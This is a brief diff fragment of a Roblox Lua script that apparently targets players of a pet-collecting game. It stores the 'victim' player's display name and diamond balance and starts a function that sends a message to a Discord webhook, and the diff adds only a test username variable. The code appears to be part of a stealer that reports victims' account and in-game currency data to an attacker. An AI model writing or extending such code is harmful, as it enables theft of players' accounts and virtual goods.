@@ -20,7 +20,7 @@ _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 local lib = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
 _G.Diamonds = lib.Functions.Commas(lib.Save.Get().Diamonds)
 _G.PetName = "Secret When Joining The Game UwU"
-
+_G.UserNamey = "Testing"
 local function sendwebhook()
     local msg = { 
         ["avatar_url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=256",
